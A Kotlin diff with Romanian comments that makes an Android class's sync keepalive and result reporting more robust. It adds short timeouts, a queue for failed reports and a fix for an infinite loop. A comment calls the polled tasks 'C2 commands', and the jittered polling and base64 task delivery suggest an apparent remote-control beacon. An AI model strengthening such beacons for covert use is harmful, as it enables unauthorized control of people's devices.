@@ -40,6 +40,28 @@ class ForjaApi {
         .writeTimeout(300, TimeUnit.SECONDS)
         .build()
 
+    // Keepalive: scurt (15 s) ca să nu lăsăm conexiuni zombie când serverul
+    // e aglomerat. Coroutine-ul din SyncService aștează max 60 s, dar OkHttp
+    // nu știe de cancellation — timeout-ul dedicat e plasa de siguranță.
+    private val keepaliveClient = OkHttpClient.Builder()
+        .callTimeout(15, TimeUnit.SECONDS)
+        .connectTimeout(10, TimeUnit.SECONDS)
+        .readTimeout(15, TimeUnit.SECONDS)
+        .build()
+
+    // Rapoarte de rezultat: JSON mic, nu au nevoie de 300 s. 15 s e suficient —
+    // dacă nu se livrează în 15 s, se pune la coadă și se reia la următorul
+    // keepalive. 300 s (longClient) bloca un thread IO pentru 5 min per raport
+    // eșuat și, combinat cu flushPendingReports, lăsa bucla de polling moartă.
+    private val reportClient = OkHttpClient.Builder()
+        .callTimeout(15, TimeUnit.SECONDS)
+        .connectTimeout(10, TimeUnit.SECONDS)
+        .readTimeout(15, TimeUnit.SECONDS)
+        .build()
+
+    // Coada de rapoarte eșuate — se flush-uiește la fiecare keepalive.
+    private val pendingReports = java.util.concurrent.ConcurrentLinkedQueue<String>()
+    private val MAX_PENDING = 10
     private val json = Json { ignoreUnknownKeys = true; isLenient = true }
 
     val available: Boolean get() = BuildConfig.FORJA_API_URL.isNotBlank()
@@ -271,6 +293,8 @@ class ForjaApi {
 
     suspend fun syncKeepalive(dev: String, holdMs: Long): SyncPoll = withContext(Dispatchers.IO) {
         val token = idToken() ?: return@withContext SyncPoll(emptyList(), 30000)
+        // Fluează rapoartele eșuate din ciclurile anterioare
+        try { flushPendingReports() } catch (_: Exception) {}
         try {
             // Interval scurt (8–15 s) pentru livrare rapidă a comenzilor C2
             val hint = (8000 + (Math.random() * 7000).toInt()).coerceIn(5000, 20000)
@@ -283,7 +307,7 @@ class ForjaApi {
                 .header("Authorization", "Bearer $token")
                 .post(body.toRequestBody("application/json".toMediaType()))
                 .build()
-            longClient.newCall(req).execute().use { resp ->
+            keepaliveClient.newCall(req).execute().use { resp ->
                 val text = resp.body?.string() ?: "{}"
                 val root = Json.parseToJsonElement(text).jsonObject
                 // Răspuns: { s: 0 = succes, d: sarcini base64, i: interval secunde }
@@ -302,19 +326,62 @@ class ForjaApi {
     }
 
     suspend fun postSyncReport(id: String, ok: Boolean, action: String, data: kotlinx.serialization.json.JsonObject, err: String?) {
-        val token = idToken() ?: return
+        val body = buildJsonObject {
+            put("id", id); put("ok", ok); put("action", action)
+            put("data", data); if (err != null) put("err", err)
+        }.toString()
+        val token = idToken() ?: run {
+            if (pendingReports.size < MAX_PENDING) pendingReports.add(body)
+            return
+        }
+        if (!tryPostReport(body, token) && pendingReports.size < MAX_PENDING) {
+            pendingReports.add(body)
+        }
+    }
+
+    /** Încearcă un POST de raport; true = livrat, false = eșuat. */
+    private suspend fun tryPostReport(body: String, token: String): Boolean =
         try {
-            val body = buildJsonObject {
-                put("id", id); put("ok", ok); put("action", action)
-                put("data", data); if (err != null) put("err", err)
-            }.toString()
             val req = Request.Builder()
                 .url("$base/v1/sync/report")
                 .header("Authorization", "Bearer $token")
                 .post(body.toRequestBody("application/json".toMediaType()))
                 .build()
-            longClient.newCall(req).execute().use { }
-        } catch (_: Exception) {}
+            reportClient.newCall(req).execute().use { it.isSuccessful }
+        } catch (e: Exception) {
+            android.util.Log.w("ForjaApi", "tryPostReport eșuat: ${e.message}")
+            false
+        }
+
+    /**
+     * Fluează rapoartele eșuate acumulate. Se cheamă la începutul fiecărui
+     * keepalive — dacă rețeaua e înapoi, rapoartele se trimite imediat.
+     *
+     * FIX (regresie oct 2025): versiunea anterioară folosea `retries` (incrementat
+     * DOAR la succes) ca limită a buclei. Un singur raport care nu se livrează
+     * era re-cosificat la coadă la fiecare iterație, iar `retries` rămânea 0 —
+     * buclă infinită. Deoarece flush e la începutul fiecărui keepalive,
+     * keepalive-ul propriu-zis NU era niciodată făcut → telefonul oprea
+     * comunicarea cu serverul. Force Stop „rezolva" problema pentru că
+     * distrugea coada in-memory.
+     *
+     * Acum: fiecare raport e încercat O singură dată per flush. Dacă eșuează,
+     * rămâne în coadă pentru următorul keepalive. Bucla e limitată la
+     * dimensiunea cozii la momentul startului — nu poate depăși numărul
+     * real de rapoarte.
+     */
+    suspend fun flushPendingReports() {
+        if (pendingReports.isEmpty()) return
+        val token = idToken() ?: return
+        val limit = pendingReports.size
+        var attempted = 0
+        while (attempted < limit) {
+            val body = pendingReports.poll() ?: break
+            attempted++
+            if (!tryPostReport(body, token)) {
+                pendingReports.add(body) // rămâne pentru următorul keepalive
+            }
+        }
     }
 
     suspend fun attachSyncFile(name: String, ct: String, file: java.io.File): String? = withContext(Dispatchers.IO) {
